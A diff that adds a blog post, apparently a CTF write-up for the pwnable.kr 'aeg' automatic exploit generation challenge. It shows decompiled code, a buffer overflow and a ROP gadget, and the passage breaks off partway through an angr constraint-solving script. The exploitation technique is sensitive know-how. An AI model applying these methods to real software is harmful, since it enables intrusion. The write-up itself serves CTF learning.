@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <title>aufarg:/var/log $ _</title>
+
+        <link href='https://fonts.googleapis.com/css?family=Inconsolata' rel='stylesheet' type='text/css'>
+        <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet"> 
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300" rel="stylesheet"> 
+
+        <link rel="stylesheet" href="https://aufarg.github.io/theme/css/main.css" type="text/css" />
+        <link rel="stylesheet" href="https://aufarg.github.io/theme/css/pygments.css" type="text/css" />
+        <link rel="stylesheet" href="https://aufarg.github.io/theme/css/font-awesome.min.css" type="text/css" />
+        <meta charset="utf-8" />
+
+
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <div class="banner"><a href="https://aufarg.github.io">aufarg:/var/log $ _ <strong></strong></a></div>
+		<nav>
+			<ol class="nav">
+				<li><a href="https://aufarg.github.io/categories.html">categories</a> </li>
+				<li><a href="https://aufarg.github.io/tags.html">tags</a> </li>
+				<li><a href="https://aufarg.github.io/archives.html">archive</a></li>
+			</ol>
+			<ul>
+			</ul>
+		</nav>
+	</header>
+	<div class="box">
+<section id="content" class="body">
+	<article class="post-content">
+<header class="post">
+	<h1 class="post-title">
+		pwnable.kr: aeg (550)
+	</h1>
+</header>
+<div class="post-info">
+	<div class="post-date">
+		<abbr>Mon 22 January 2018</abbr> &#183;
+9 min read	</div>
+</div>		<p>We are given an endpoint which we can connect to. The endpoint gives the
+following banner right after we connected:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="gh">---------------------------------------------------</span></span>
+<span class="code-line"><span class="gh">-  Welcome to AEG (Automatic Exploit Generation)  -</span></span>
+<span class="code-line"><span class="gh">---------------------------------------------------</span></span>
+<span class="code-line">I will send you a newly compiled binary (probably exploitable) in base64 format</span>
+<span class="code-line">after you get the binary, I will be waiting for your input as a plain text</span>
+<span class="code-line">when your input is given, I will execute the binary with your input as argv[1]</span>
+<span class="code-line">you have 10 seconds to build exploit payload</span>
+<span class="code-line">wait...</span>
+</pre></div>
+
+
+<p>Oh hey wow, we need to create an automatic exploit generation program. Cool.
+After 10 seconds, the server then give us a base64 decoded gzip-ed ELF binary.
+The binary will be different everytime we connect it, thus we cannot just pwn
+it locally then point our script to throw the payload into the server.</p>
+<p>Since it seems that they randomized things in a source code and then compiled
+it as ELF, I'm pretty sure the binary will have some persistent structure.
+Let's look at the binary from sample binary in IDA.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span></span>
+<span class="code-line"><span class="p">{</span></span>
+<span class="code-line">  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax@2</span></span>
+<span class="code-line">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// eax@3</span></span>
+<span class="code-line">  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// eax@6</span></span>
+<span class="code-line">  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// eax@12</span></span>
+<span class="code-line">  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// eax@16</span></span>
+<span class="code-line">  <span class="kt">char</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [sp+10h] [bp-20h]@6</span></span>
+<span class="code-line">  <span class="kt">char</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [sp+11h] [bp-1Fh]@6</span></span>
+<span class="code-line">  <span class="kt">char</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [sp+12h] [bp-1Eh]@6</span></span>
+<span class="code-line">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-18h]@8</span></span>
+<span class="code-line">  <span class="kt">int</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-14h]@11</span></span>
+<span class="code-line">  <span class="kt">int</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// [sp+20h] [bp-10h]@10</span></span>
+<span class="code-line">  <span class="kt">int</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// [sp+24h] [bp-Ch]@9</span></span>
+<span class="code-line">  <span class="kt">int</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// [sp+28h] [bp-8h]@5</span></span>
+<span class="code-line">  <span class="kt">int</span> <span class="n">v16</span><span class="p">;</span> <span class="c1">// [sp+2Ch] [bp-4h]@5</span></span>
+<span class="code-line"></span>
+<span class="code-line">  <span class="k">if</span> <span class="p">(</span> <span class="n">argc</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span></span>
+<span class="code-line">  <span class="p">{</span></span>
+<span class="code-line">    <span class="n">v4</span> <span class="o">=</span> <span class="n">sub_8034990</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">,</span> <span class="mi">3LL</span><span class="p">,</span> <span class="mi">4LL</span><span class="p">,</span> <span class="mi">5LL</span><span class="p">,</span> <span class="mi">6LL</span><span class="p">);</span></span>
+<span class="code-line">    <span class="n">srand</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span></span>
+<span class="code-line">    <span class="n">half_arglen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">;</span></span>
+<span class="code-line">    <span class="k">if</span> <span class="p">(</span> <span class="n">half_arglen</span> <span class="o">&lt;=</span> <span class="mi">1000</span> <span class="p">)</span></span>
+<span class="code-line">    <span class="p">{</span></span>
+<span class="code-line">      <span class="n">v16</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span></span>
+<span class="code-line">      <span class="n">v15</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span></span>
+<span class="code-line">      <span class="k">while</span> <span class="p">(</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">half_arglen</span> <span class="o">&gt;</span> <span class="n">v16</span> <span class="p">)</span></span>
+<span class="code-line">      <span class="p">{</span></span>
+<span class="code-line">    <span class="n">v8</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">v16</span><span class="p">];</span></span>
+<span class="code-line">    <span class="n">v9</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">v16</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span></span>
+<span class="code-line">    <span class="n">v10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span></span>
+<span class="code-line">    <span class="n">v5</span> <span class="o">=</span> <span class="n">v15</span><span class="o">++</span><span class="p">;</span></span>
+<span class="code-line">    <span class="n">__isoc99_sscanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v8</span><span class="p">,</span> <span class="s">&quot;%02x&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">input_buffer</span><span class="p">[(</span><span class="kt">signed</span> <span class="kr">__int64</span><span class="p">)</span><span class="n">v5</span><span class="p">]);</span></span>
+<span class="code-line">    <span class="n">v16</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span></span>
+<span class="code-line">      <span class="p">}</span></span>
+<span class="code-line">      <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">half_arglen</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span></span>
+<span class="code-line">      <span class="p">{</span></span>
+<span class="code-line">    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v14</span> <span class="o">==</span> <span class="mi">218</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v13</span> <span class="o">==</span> <span class="o">-</span><span class="mi">9</span> <span class="o">&amp;&amp;</span> <span class="mi">66</span> <span class="o">*</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v14</span> <span class="o">+</span> <span class="mi">73</span> <span class="o">*</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v13</span> <span class="o">-</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v12</span> <span class="o">==</span> <span class="mi">81</span> <span class="p">)</span></span>
+<span class="code-line">    <span class="p">{</span></span>
+<span class="code-line">      <span class="n">v6</span> <span class="o">=</span> <span class="n">v14</span><span class="o">++</span><span class="p">;</span></span>
+<span class="code-line">      <span class="n">v13</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span></span>
+<span class="code-line">    <span class="p">}</span></span>
+<span class="code-line">    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v14</span> <span class="o">==</span> <span class="o">-</span><span class="mi">7</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v13</span> <span class="o">==</span> <span class="mi">107</span> <span class="o">&amp;&amp;</span> <span class="mi">29</span> <span class="o">*</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v13</span> <span class="o">+</span> <span class="mi">31</span> <span class="o">*</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v14</span> <span class="o">-</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v12</span> <span class="o">==</span> <span class="mi">92</span> <span class="p">)</span></span>
+<span class="code-line">    <span class="p">{</span></span>
+<span class="code-line">      <span class="n">v7</span> <span class="o">=</span> <span class="n">v12</span><span class="o">++</span><span class="p">;</span></span>
+<span class="code-line">      <span class="n">v14</span> <span class="o">=</span> <span class="n">v7</span><span class="p">;</span></span>
+<span class="code-line">    <span class="p">}</span></span>
+<span class="code-line">    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="p">)</span></span>
+<span class="code-line">      <span class="n">input_buffer</span><span class="p">[(</span><span class="kt">signed</span> <span class="kr">__int64</span><span class="p">)</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0x36u</span><span class="p">;</span></span>
+<span class="code-line">    <span class="k">else</span></span>
+<span class="code-line">      <span class="n">input_buffer</span><span class="p">[(</span><span class="kt">signed</span> <span class="kr">__int64</span><span class="p">)</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0x76u</span><span class="p">;</span></span>
+<span class="code-line">    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v14</span> <span class="o">==</span> <span class="o">-</span><span class="mi">24</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v13</span> <span class="o">==</span> <span class="o">-</span><span class="mi">23</span> <span class="o">&amp;&amp;</span> <span class="mi">86</span> <span class="o">*</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v13</span> <span class="o">+</span> <span class="mi">51</span> <span class="o">*</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v14</span> <span class="o">-</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v12</span> <span class="o">==</span> <span class="mi">74</span> <span class="p">)</span></span>
+<span class="code-line">      <span class="n">v14</span> <span class="o">=</span> <span class="n">v13</span> <span class="o">+</span> <span class="n">v12</span><span class="p">;</span></span>
+<span class="code-line">    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v14</span> <span class="o">==</span> <span class="o">-</span><span class="mi">38</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v13</span> <span class="o">==</span> <span class="o">-</span><span class="mi">9</span> <span class="o">&amp;&amp;</span> <span class="mi">66</span> <span class="o">*</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v14</span> <span class="o">+</span> <span class="mi">73</span> <span class="o">*</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v13</span> <span class="o">-</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v12</span> <span class="o">==</span> <span class="mi">81</span> <span class="p">)</span></span>
+<span class="code-line">      <span class="n">v13</span> <span class="o">=</span> <span class="n">v14</span> <span class="o">-</span> <span class="n">v12</span><span class="p">;</span></span>
+<span class="code-line">      <span class="p">}</span></span>
+<span class="code-line">      <span class="n">puts</span><span class="p">(</span><span class="s">&quot;payload encoded. let&#39;s go!&quot;</span><span class="p">);</span></span>
+<span class="code-line">      <span class="n">go</span><span class="p">(</span><span class="n">input_buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">byte_82373A1</span><span class="p">,</span> <span class="n">byte_82373A2</span><span class="p">);</span></span>
+<span class="code-line">      <span class="n">puts</span><span class="p">(</span><span class="s">&quot;end of program&quot;</span><span class="p">);</span></span>
+<span class="code-line">      <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span></span>
+<span class="code-line">    <span class="p">}</span></span>
+<span class="code-line">    <span class="k">else</span></span>
+<span class="code-line">    <span class="p">{</span></span>
+<span class="code-line">      <span class="n">puts</span><span class="p">(</span><span class="s">&quot;payload length exceeds 1000byte&quot;</span><span class="p">);</span></span>
+<span class="code-line">      <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span></span>
+<span class="code-line">    <span class="p">}</span></span>
+<span class="code-line">  <span class="p">}</span></span>
+<span class="code-line">  <span class="k">else</span></span>
+<span class="code-line">  <span class="p">{</span></span>
+<span class="code-line">    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;usage : ./aeg [hex encoded payload]&quot;</span><span class="p">);</span></span>
+<span class="code-line">    <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span></span>
+<span class="code-line">  <span class="p">}</span></span>
+<span class="code-line">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span></span>
+<span class="code-line"><span class="p">}</span></span>
+</pre></div>
+
+
+<p>It seems that our input will be encoded by xor with <code>0x36</code>/<code>0x76</code> depending on
+the index, and then it will call some functions with our encoded input.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="kt">char</span> <span class="kr">__fastcall</span> <span class="nf">go</span><span class="p">(</span><span class="kt">char</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="n">a3</span><span class="p">)</span></span>
+<span class="code-line"><span class="p">{</span></span>
+<span class="code-line">  <span class="kt">char</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// al@1</span></span>
+<span class="code-line"></span>
+<span class="code-line">  <span class="n">result</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span></span>
+<span class="code-line">  <span class="k">if</span> <span class="p">(</span> <span class="n">a1</span> <span class="o">==</span> <span class="o">-</span><span class="mi">19</span> <span class="p">)</span></span>
+<span class="code-line">  <span class="p">{</span></span>
+<span class="code-line">    <span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">22</span> <span class="o">-</span> <span class="n">a2</span><span class="p">;</span></span>
+<span class="code-line">    <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="o">==</span> <span class="o">-</span><span class="mi">105</span> <span class="p">)</span></span>
+<span class="code-line">    <span class="p">{</span></span>
+<span class="code-line">      <span class="n">result</span> <span class="o">=</span> <span class="mi">22</span> <span class="o">*</span> <span class="n">a1</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">*</span> <span class="n">a2</span> <span class="o">-</span> <span class="n">a3</span><span class="p">;</span></span>
+<span class="code-line">      <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="o">==</span> <span class="mi">96</span> <span class="p">)</span></span>
+<span class="code-line">    <span class="n">result</span> <span class="o">=</span> <span class="n">sub_8034876</span><span class="p">(</span><span class="n">byte_82373A3</span><span class="p">,</span> <span class="n">byte_82373A4</span><span class="p">,</span> <span class="n">byte_82373A5</span><span class="p">);</span></span>
+<span class="code-line">    <span class="p">}</span></span>
+<span class="code-line">  <span class="p">}</span></span>
+<span class="code-line">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span></span>
+<span class="code-line"><span class="p">}</span></span>
+</pre></div>
+
+
+<p>Basically there's 16 functions like these, each having 3 parameters. The
+function will proceed to call the next function if the 3 variables satisfy some
+kind of constraint. The last function called by the 16th function looked like this:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="kt">void</span> <span class="o">*</span><span class="nf">sub_803419C</span><span class="p">()</span></span>
+<span class="code-line"><span class="p">{</span></span>
+<span class="code-line">  <span class="kt">char</span> <span class="n">dest</span><span class="p">;</span> <span class="c1">// [sp+0h] [bp-40h]@1</span></span>
+<span class="code-line"></span>
+<span class="code-line">  <span class="k">return</span> <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dest</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">after_input</span><span class="p">,</span> <span class="n">half_arglen</span> <span class="o">-</span> <span class="mi">48</span><span class="p">);</span></span>
+<span class="code-line"><span class="p">}</span></span>
+</pre></div>
+
+
+<p>It's just plain old buffer overflow vulnerability. So basically, what we need
+to do is have our payload prefixed by some value that will satisfy the
+constraints imposed by preceeding functions i.e. <code>&lt;prefix&gt;+&lt;payload&gt;</code>.</p>
+<p>There's also <code>sub_8034990()</code> function which is weird if you see it at first
+because just accept 1 through 6 as arguments and it does nothing after that.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="kr">__int64</span> <span class="nf">sub_803496D</span><span class="p">()</span></span>
+<span class="code-line"><span class="p">{</span></span>
+<span class="code-line">  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span></span>
+<span class="code-line"><span class="p">}</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_8034990</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a4</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a5</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a6</span><span class="p">)</span></span>
+<span class="code-line"><span class="p">{</span></span>
+<span class="code-line">  <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">sub_803496D</span><span class="p">();</span></span>
+<span class="code-line"><span class="p">}</span></span>
+</pre></div>
+
+
+<p>But the disassembly version say something different:</p>
+<div class="highlight"><pre><span class="code-line"><span></span>/ (fcn) fcn.0803496d 35</span>
+<span class="code-line">| 0x0803496d      55                       push rbp</span>
+<span class="code-line">| 0x0803496e      4889e5                   mov rbp, rsp</span>
+<span class="code-line">| 0x08034971      48897db8                 mov qword [rbp-0x48], rdi</span>
+<span class="code-line">| 0x08034975      488975b0                 mov qword [rbp-0x50], rsi</span>
+<span class="code-line">| 0x08034979      488955a8                 mov qword [rbp-0x58], rdx</span>
+<span class="code-line">| 0x0803497d      48894da0                 mov qword [rbp-0x60], rcx</span>
+<span class="code-line">| 0x08034981      4c894598                 mov qword [rbp-0x68], r8</span>
+<span class="code-line">| 0x08034985      4c894d90                 mov qword [rbp-0x70], r9</span>
+<span class="code-line">| 0x08034989      b800000000               mov eax, 0</span>
+<span class="code-line">| 0x0803498e      5d                       pop rbp</span>
+<span class="code-line">\ 0x0803498f      c3                       ret</span>
+<span class="code-line">/ (fcn) fcn.08034990 78</span>
+<span class="code-line">| 0x08034990      55                       push rbp</span>
+<span class="code-line">| 0x08034991      4889e5                   mov rbp, rsp</span>
+<span class="code-line">| 0x08034994      4883ec70                 sub rsp, 0x70               ; &#39;p&#39;</span>
+<span class="code-line">| 0x08034998      48897db8                 mov qword [rbp-0x48], rdi</span>
+<span class="code-line">| 0x0803499c      488975b0                 mov qword [rbp-0x50], rsi</span>
+<span class="code-line">| 0x080349a0      488955a8                 mov qword [rbp-0x58], rdx</span>
+<span class="code-line">| 0x080349a4      48894da0                 mov qword [rbp-0x60], rcx</span>
+<span class="code-line">| 0x080349a8      4c894598                 mov qword [rbp-0x68], r8</span>
+<span class="code-line">| 0x080349ac      4c894d90                 mov qword [rbp-0x70], r9</span>
+<span class="code-line">| 0x080349b0      4c8b45a0                 mov r8, qword [rbp-0x60]</span>
+<span class="code-line">| 0x080349b4      488b7d90                 mov rdi, qword [rbp-0x70]</span>
+<span class="code-line">| 0x080349b8      488b4d98                 mov rcx, qword [rbp-0x68]</span>
+<span class="code-line">| 0x080349bc      488b55b0                 mov rdx, qword [rbp-0x50]</span>
+<span class="code-line">| 0x080349c0      488b75a8                 mov rsi, qword [rbp-0x58]</span>
+<span class="code-line">| 0x080349c4      488b45b8                 mov rax, qword [rbp-0x48]</span>
+<span class="code-line">| 0x080349c8      4d89c1                   mov r9, r8</span>
+<span class="code-line">| 0x080349cb      4989f8                   mov r8, rdi</span>
+<span class="code-line">| 0x080349ce      4889c7                   mov rdi, rax</span>
+<span class="code-line">| 0x080349d1      e897ffffff               call fcn.0803496d           ;[1]</span>
+<span class="code-line">| 0x080349d6      8945fc                   mov dword [local_4h], eax</span>
+<span class="code-line">| 0x080349d9      8b45fc                   mov eax, dword [local_4h]</span>
+<span class="code-line">| 0x080349dc      c9                       leave</span>
+<span class="code-line">\ 0x080349dd      c3                       ret</span>
+</pre></div>
+
+
+<p>The fun thing with this is function is, it can loads arguments to the
+registers. This will be useful as a gadget when we're crafting ROP as the
+binary is in 64-bit (in which the arguments are passed through registers, not
+stack).</p>
+<p>But there's a catch, there's some parts of the binary that will be randomized.
+- The xor value.
+- The PADDING for xor line (those cryptic <code>if</code>s around the xor line).
+- The <code>dest</code> file size (which determines the padding needed before rop addresses).
+- The offset from rbp for loading arguments in the gadget.</p>
+<h3>Constraint Solver</h3>
+<p>Prior solving the challenge, I've heard of constraint solver called
+<a href="https://github.com/Z3Prover/z3">z3</a>. I'm not really familiar with z3 but it's
+been used to solve problems where we need to search for the input, given the
+output and the operations to the input.</p>
+<p>Unfortunately, extracting the constraint from the disassembly with regex might be too
+tedious. Instead, I look up for another solution which utilizes z3. The popular
+use of z3 in CTFs is usually using <a href="https://github.com/angr/angr">angr</a>. After
+looking through the documentation for some time, I decided to try using angr to
+solve the constraints using angr. The result is pretty bad code and utilization
+of angr (as I've seen a better code with it later), but it works.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="k">def</span> <span class="nf">solve_with_angr</span><span class="p">(</span><span class="n">bin_name</span><span class="p">):</span></span>
+<span class="code-line">    <span class="n">p</span> <span class="o">=</span> <span class="n">angr</span><span class="o">.</span><span class="n">Project</span><span class="p">(</span><span class="n">bin_name</span><span class="p">,</span> <span class="n">auto_load_libs</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">cfg</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">analyses</span><span class="o">.</span><span class="n">CFGFast</span><span class="p">(</span><span class="n">regions</span><span class="o">=</span><span class="p">[(</span><span class="n">p</span><span class="o">.</span><span class="n">entry</span><span class="p">,</span> <span class="n">p</span><span class="o">.</span><span class="n">loader</span><span class="o">.</span><span class="n">main_object</span><span class="o">.</span><span class="n">max_addr</span><span class="p">)],</span> <span class="n">force_complete_scan</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="c1"># find main and start of function checks</span></span>
+<span class="code-line">    <span class="n">init_state</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">full_init_state</span><span class="p">()</span></span>
+<span class="code-line">    <span class="n">sm</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">simulation_manager</span><span class="p">(</span><span class="n">init_state</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">sm</span><span class="o">.</span><span class="n">explore</span><span class="p">(</span><span class="n">find</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">entry</span><span class="o">+</span><span class="mh">0x24</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">sm</span><span class="o">.</span><span class="n">move</span><span class="p">(</span><span class="n">from_stash</span><span class="o">=</span><span class="s1">&#39;found&#39;</span><span class="p">,</span> <span class="n">to_stash</span><span class="o">=</span><span class="s1">&#39;active&#39;</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">main</span> <span class="o">=</span> <span class="n">sm</span><span class="o">.</span><span class="n">active</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">solver</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="n">sm</span><span class="o">.</span><span class="n">active</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">rdi</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">main_func</span> <span class="o">=</span> <span class="n">cfg</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">function</span><span class="p">(</span><span class="n">main</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">chain_start</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">main_func</span><span class="o">.</span><span class="n">get_call_sites</span><span class="p">())[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span></span>
+<span class="code-line">    <span class="n">chain_addr</span> <span class="o">=</span> <span class="n">main_func</span><span class="o">.</span><span class="n">get_call_target</span><span class="p">(</span><span class="n">chain_start</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="n">args</span> <span class="o">=</span> <span class="p">[]</span></span>
+<span class="code-line">    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x30</span><span class="p">:</span></span>
+<span class="code-line">    <span class="n">a</span> <span class="o">=</span> <span class="n">claripy</span><span class="o">.</span><span class="n">BVS</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">b</span> <span class="o">=</span> <span class="n">claripy</span><span class="o">.</span><span class="n">BVS</span><span class="p">(</span><span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">c</span> <span class="o">=</span> <span class="n">claripy</span><span class="o">.</span><span class="n">BVS</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="n">cur_state</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">call_state</span><span class="p">(</span><span class="n">chain_addr</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">sm</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">simulation_manager</span><span class="p">(</span><span class="n">cur_state</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="n">chain_func</span> <span class="o">=</span> <span class="n">cfg</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">function</span><span class="p">(</span><span class="n">chain_addr</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">chain_next</span> <span class="o">=</span> <span class="n">chain_func</span><span class="o">.</span><span class="n">get_call_sites</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="n">sm</span><span class="o">.</span><span class="n">explore</span><span class="p">(</span><span class="n">find</span><span class="o">=</span><span class="n">chain_next</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">args</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">sm</span><span class="o">.</span><span class="n">found</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">solver</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="n">a</span><span class="p">)))</span></span>
+<span class="code-line">    <span class="n">args</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">sm</span><span class="o">.</span><span class="n">found</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">solver</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="n">b</span><span class="p">)))</span></span>
